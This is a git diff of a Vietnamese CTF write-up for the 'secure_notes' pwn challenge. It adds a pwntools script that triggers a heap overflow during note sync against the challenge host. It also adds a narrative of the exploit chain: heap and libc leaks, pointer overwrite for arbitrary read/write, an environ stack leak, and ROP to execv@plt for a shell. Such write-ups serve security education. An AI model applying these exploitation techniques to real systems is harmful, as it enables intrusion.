@@ -436,7 +436,94 @@ Sau một thời gian audit, ta nhận thấy có một bug trong quá trình sy
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4fbcadf8-fdfd-46ac-9735-906a157852ca)
 
-Ở đây interface thực hiện copy buffer từ note được gửi về từ server và size cũng được quyết định bởi note của server, do đó ta sẽ có một bug heap-based buffer overflow.
+Ở đây interface thực hiện sync các note copy buffer từ note được gửi về từ server và size cũng được quyết định bởi note của server, do đó ta sẽ có một bug heap-based buffer overflow. 
+
+```py
+from pwn import *
+from pwn import unpack, p64, u64
+
+if args.REMOTE:
+    io = remote("secure_notes1.pwnable.vn", 31331)
+else:
+    io = process(["./interface", "./backend"])
+    # io = process(["./interface_orig_patched", "./backend_orig_patched"])
+    # io = remote("localhost", 8089)
+
+
+libc = ELF("./libc.so.6.bak", checksec=False)
+exe = ELF("./interface_orig", checksec=False)
+
+def add_new_note(title, author, is_encrypted, passwd, content_length, content):
+    io.sendlineafter(b"Choice: ", b"1")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+    io.sendlineafter(b"Wanna encrypt this notes? (y/n) ", b"y" if is_encrypted else b"n")
+    if is_encrypted:
+        io.sendlineafter(b"What is your passwd? ", passwd)
+    io.sendlineafter(b"How many bytes for content? ", str(content_length).encode())
+    io.sendlineafter(b"Content:", content)
+
+def note_sync(flag):
+    io.sendlineafter(b"Choice: ", b"6")
+    io.sendlineafter(b"You you want to [s]ync or [c]ommit note? (s/c)", b"c" if flag == 1 else b"s")
+
+def delete_note(title, author, is_encrypted, password):
+    io.sendlineafter(b"Choice: ", b"5")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+    if is_encrypted:
+        io.sendlineafter(b"Your password? ", password)
+
+def read_note(title, author, is_encrypted, passwd):
+    io.sendlineafter(b"Choice: ", b"3")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+    if is_encrypted:
+        io.sendlineafter(b"Password?", passwd)
+
+def list_note():
+    io.sendlineafter(b"Choice: ", b"2")
+
+def edit_note(title, author, is_encrypted, passwd, content_len, content):
+    io.sendlineafter(b"Choice: ", b"4")
+    io.sendlineafter(b"Title: ", title)
+    io.sendlineafter(b"Author: ", author)
+
+    if is_encrypted:
+        io.sendlineafter(b"Password ?", passwd)
+    io.sendlineafter(b"New content len?", str(content_len).encode())
+    io.sendlineafter(b"New content:", content)
+    
+
+add_new_note(b"shin24", b"shin24", False, None, 0, b"aaaaa")
+
+add_new_note(b"shin24", b"shin24", True, b"123", 960, b"A"*(928))
+
+edit_note(b"shin24", b"shin24", False, None, 40, b"aaaaaaa")
+
+note_sync(0)
+io.interactive()
+```
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ad56da62-cf6b-4f1a-bc52-94fb482a1020)
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/642b5990-386a-405d-8c8c-1800d65bd6af)
+
+### Exploitation
+
+Đầu tiên về memleak thì mình lợi dụng việc interface dùng memcpy, nên ta có thể copy sao cho data của ta nằm ngay kế các pointer cần leak, cách này sẽ vô tình phá hủy một phần heap khá lớn và làm cho đoạn exploit sau khó hơn...
+
+Sau khi leak được heap, ta có thể tiếp tục leak libc bằng cách tìm pointer đến main_arena trên heap, lúc này thì có một vấn đề đó là docker sử dụng image `ubuntu@latest`, nghĩa là docker lúc mình build sẽ khác version libc với docker lúc challenge được start lên (đâu đó gần nửa năm). Mình quyết định lên docker tìm các image có behavior mà mình cảm thấy giống với remote nhất và cuối cùng tìm được `ubuntu@sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0da`.
+
+Tiếp tục với việc leak libc, ta có thể allocate cho 2 note kế cạnh nhau, sau đó từ note overflow để ghi đè buffer pointer của note 2, sau đó cho in note này ra, thế là ta đã có một read primitive. Sau khi leak được libc, ta làm điều tương tự để leak stack thông qua `environ`, tiếp theo ta sẽ control RIP bằng ROP thông qua write primitive (vì ta đã control được pointer của buffer, do đó ta có thể dùng bug desync ban đầu để ghi vào địa chỉ bất kì)
+
+Tuy nhiên thì còn một vấn đề nữa, đó là sau khi có shell ở local, mình lại fail khi exploit trên remote, sau vài lần thử thì mình nhận ra lý do là vì có lẽ version libc vẫn chưa chuẩn lắm, việc leak được stack thông qua environ có vẻ là một sự may mắn khi offset của environ của libc mình dùng và libc của remote trùng nhau. Cuối cùng thì mình quyết định là thay vì cố gắng tìm libc đúng, mình dùng luôn một plt entry có sẵn là `execv@plt`
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e94f133f-3ad6-4469-95c1-8b0b36ed662b)
+
+Sau vài lần chạy không trơn tru, cuối cùng mình cũng thành công có được shell trên remote
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ca4de6e2-ecbc-4796-89e1-83cd1528430a)
 
 ```python
 from pwn import *
@@ -494,8 +581,6 @@ def edit_note(title, author, is_encrypted, passwd, content_len, content):
     io.sendlineafter(b"New content len?", str(content_len).encode())
     io.sendlineafter(b"New content:", content)
     
-
-
 
 add_new_note(b"shin24", b"shin24", False, None, 0, b"aaaaa")
 add_new_note(b"shin24", b"shin24", True, b"123", 960, b"A"*(928))
